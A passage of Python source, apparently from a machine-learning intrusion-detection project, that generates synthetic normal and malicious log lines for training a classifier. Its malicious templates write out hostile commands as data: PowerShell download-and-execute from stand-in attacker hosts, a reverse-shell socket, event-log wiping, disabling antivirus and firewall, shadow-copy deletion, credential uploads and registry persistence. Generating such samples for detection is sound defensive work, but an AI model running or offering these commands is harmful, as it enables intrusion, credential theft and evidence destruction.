             "{dur} tcp ftp SF {sb} {db} 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 normal 21",
             # Normal ftp_data (db>0, nfc=0 distinguishes from warezclient)
             "{dur} tcp ftp_data SF {sb} {db} 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 normal 19",
             "{dur} udp domain SF {sb} {db} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 {cnt} {srv} 0.0 0.0 0.0 0.0 1.0 0.0 0.0 {dhc} {dhsc} 1.0 0.0 0.5 0.0 0.0 0.0 0.0 0.0 normal 18"]
        res=[]
        for _ in range(n):
            if rng.random()<0.40:
                # Normal ftp_data: sb AND db both nonzero (unlike warezclient db=0)
                res.append(rng.choice(nsl).format(dur=rng.randint(0,300),sb=rng.randint(100,10000),
                    db=rng.randint(500,50000),cnt=rng.randint(1,50),srv=rng.randint(1,50),
                    dhc=rng.randint(1,100),dhsc=rng.randint(1,100)))
            else:
                ip=f"{rng.randint(10,192)}.{rng.randint(0,254)}.{rng.randint(0,254)}.{rng.randint(1,254)}"
                ip2=f"{rng.randint(10,192)}.{rng.randint(0,254)}.{rng.randint(0,254)}.{rng.randint(1,254)}"
                res.append(rng.choice(syslog).format(pid=rng.randint(1000,65000),user=rng.choice(users),
                    svc=rng.choice(svcs),ip=ip,ip2=ip2,port=rng.choice([80,443,22,8080,3306]),
                    b=rng.randint(100,50000),os=rng.choice(oses)))
        return res

    def predict(self,log_line):
        if not self.is_trained: raise RuntimeError("Not trained.")
        X=self._build_matrix([log_line],fit_tfidf=False)
        proba=self.xgb.predict_proba(X)[0]; idx=int(np.argmax(proba))
        threat=self.label_encoder.inverse_transform([idx])[0]; conf=float(proba[idx])
        signals=self.parse(log_line)
        top=sorted([(k,v) for k,v in signals.items() if v>0 and not k.startswith('nsl_')],key=lambda x:x[1],reverse=True)[:5]
        return {'threat_type':threat,'severity':SEVERITY_MAP.get(threat,'medium'),'confidence':round(conf,4),
                'is_threat':threat!='NORMAL','remediation_actions':REMEDIATION_MAP.get(threat,[]),'top_signals':top}

    def predict_batch(self,lines): return [self.predict(l) for l in lines]

    def save(self,path):
        os.makedirs(os.path.dirname(os.path.abspath(path)),exist_ok=True)
        joblib.dump(self,path); print(f"  Model saved -> {path}")

    @classmethod
    def load(cls,path):
        obj=joblib.load(path)
        if not isinstance(obj,cls): raise TypeError(f"Not UpgradedAMIDES: {type(obj)}")
        return obj


# =============================================================================
# SOCBED generators
# =============================================================================

def _gen_powershell(nm,nb):
    rng=random.Random(42)
    mal=["powershell -EncodedCommand {b64} -NonInteractive -WindowStyle Hidden",
         "powershell.exe -exec bypass -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{host}/stage{n}.ps1')\"",
         "wevtutil cl {log} && wevtutil cl System && wevtutil cl Application",
         "Clear-EventLog -LogName {log},System,Application -Confirm:$false",
         "Remove-Item -Path C:\\Windows\\System32\\winevt\\Logs\\{log}.evtx -Force",
         "Set-MpPreference -DisableRealtimeMonitoring $true","powershell -c \"auditpol /clear /y && net stop EventLog\"",
         "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://{ip}/payload{n}.ps1')",
         "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port})\""]
    ben=["powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\backup{n}.ps1",
         "Get-EventLog -LogName Application -Newest {n} | Export-Csv C:\\reports\\app{n}.csv",
         "Invoke-WebRequest -Uri https://download.microsoft.com/update{n}.msi -OutFile update{n}.msi",
         "Test-NetConnection -ComputerName server{n}.corp.local -Port 443"]
    b64s=["SQBFAFgA","UwB0AGEAcgB0AA=="]; hosts=["evil.com","malware-c2.ru","bad-domain.xyz"]
    ips=["185.220.101.5","10.10.10.99"]; logs=["Security","System","Application"]; ports=[4444,8080,1337]
    fm=lambda t: t.format(b64=rng.choice(b64s),host=rng.choice(hosts),ip=rng.choice(ips),n=rng.randint(1,99),log=rng.choice(logs),port=rng.choice(ports))
    fb=lambda t: t.format(n=rng.randint(1,99))
    return [fm(rng.choice(mal)) for _ in range(nm)],[fb(rng.choice(ben)) for _ in range(nb)]

def _gen_process_creation(nm,nb):
    rng=random.Random(43)
    mal=["EventID=4688 NewProcessName=cmd.exe CommandLine=cmd /c whoami /all && net user /domain",
         "EventID=4688 NewProcessName=net.exe CommandLine=net user administrator{n} /active:yes",
         "EventID=4688 NewProcessName=schtasks.exe CommandLine=schtasks /create /sc onlogon /tn Updater{n} /tr C:\\tmp\\evil{n}.exe /f",
         "EventID=1102 AuditLogCleared SubjectUserName=attacker{n} SubjectDomainName=CORP LogName=Security",
         "EventID=4688 NewProcessName=vssadmin.exe CommandLine=vssadmin delete shadows /all /quiet",
         "EventID=4688 NewProcessName=certutil.exe CommandLine=certutil -urlcache -split -f http://{host}/mal{n}.exe",
         "EventID=4688 NewProcessName=cmd.exe CommandLine=cmd /c wevtutil el | ForEach-Object {{ wevtutil cl $_ }}",
         "EventID=4688 NewProcessName=netsh.exe CommandLine=netsh advfirewall set allprofiles state off"]
    ben=["EventID=4688 NewProcessName=notepad.exe CommandLine=notepad.exe C:\\Users\\user{n}\\notes.txt",
         "EventID=4688 NewProcessName=chrome.exe CommandLine=chrome.exe --new-window",
         "EventID=4688 NewProcessName=svchost.exe CommandLine=svchost.exe -k netsvcs -p",
         "EventID=4688 NewProcessName=msiexec.exe CommandLine=msiexec /package Office{n}.msi /quiet"]
    hosts=["evil.com","malware-c2.ru"]; b64s=["SQBFAFgA","cwBlAHQA"]
    fm=lambda t: t.format(n=rng.randint(1,99),host=rng.choice(hosts),b64=rng.choice(b64s))
    fb=lambda t: t.format(n=rng.randint(1,99))
    return [fm(rng.choice(mal)) for _ in range(nm)],[fb(rng.choice(ben)) for _ in range(nb)]

def _gen_proxy_web(nm,nb):
    rng=random.Random(44)
    mal=["GET http://{host}/callback?id=infected{n}&cmd=exec HTTP/1.1 200 bytes={size}",
         "POST http://{ip}/upload?file=credentials{n}.zip HTTP/1.1 200 content-length={size}",
         "GET http://pastebin.com/raw/{token} HTTP/1.1 200 user-agent=powershell/5.1",
         "GET http://{host}/payload{n}.ps1 HTTP/1.1 200 user-agent=powershell",
         "GET http://{ip}:4444/shell{n}.php?cmd=id HTTP/1.1 200",
         "POST http://{ip}/upload BODY=credentials{n}.db size={size} user-agent=python-requests"]
    ben=["GET https://www.google.com/search?q=python+tutorial+{n} HTTP/1.1 200",
         "GET https://cdn.office365.com/updates/v{n}/manifest.xml HTTP/1.1 200",
         "POST https://api.github.com/repos/myorg/myrepo{n}/issues HTTP/1.1 201",
         "POST https://slack.com/api/chat.postMessage HTTP/1.1 200 msg_id={n}"]
    hosts=["malware-c2.ru","evil.xyz"]; ips=["185.220.101.5","10.0.0.5"]; tokens=["aB3xY9kL","Zq9xY2mP"]
    fm=lambda t: t.format(host=rng.choice(hosts),ip=rng.choice(ips),n=rng.randint(1,99),token=rng.choice(tokens),size=rng.randint(512,8192000))
    fb=lambda t: t.format(n=rng.randint(1,99))
    return [fm(rng.choice(mal)) for _ in range(nm)],[fb(rng.choice(ben)) for _ in range(nb)]

def _gen_registry(nm,nb):
    rng=random.Random(45)
    mal=["EventID=13 TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{proc}.exe Details=cmd.exe",
         "EventID=13 TargetObject=HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater{n} Details=C:\\tmp\\malware{n}.exe",
         "EventID=12 TargetObject=HKLM\\SYSTEM\\CurrentControlSet\\Services\\malSvc{n} ImagePath=C:\\tmp\\evil{n}.exe start=2",
         "EventID=13 TargetObject=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware Details=1",
         "EventID=13 TargetObject=HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\payload{n} Details=powershell -enc {b64}",
         "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1",
         "EventID=4657 ObjectName=HKEY_LOCAL_MACHINE\\SAM\\SAM OperationType=SetValue NewValue=<binary_{n}> SubjectUserName=SYSTEM"]
    ben=["EventID=12 TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive{n}",
         "EventID=13 TargetObject=HKCU\\Control Panel\\Desktop\\WallPaper Details=C:\\Users\\user{n}\\Pictures\\wallpaper.jpg",
         "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{{App{n}}}",
         "reg add HKCU\\SOFTWARE\\MyApp{n} /v Language /t REG_SZ /d en-US"]
    procs=["sethc","utilman","osk","magnify","narrator"]; b64s=["SQBFAFgA","cwBlAHQA"]
    fm=lambda t: t.format(n=rng.randint(1,99),proc=rng.choice(procs),b64=rng.choice(b64s))
    fb=lambda t: t.format(n=rng.randint(1,99))
    return [fm(rng.choice(mal)) for _ in range(nm)],[fb(rng.choice(ben)) for _ in range(nb)]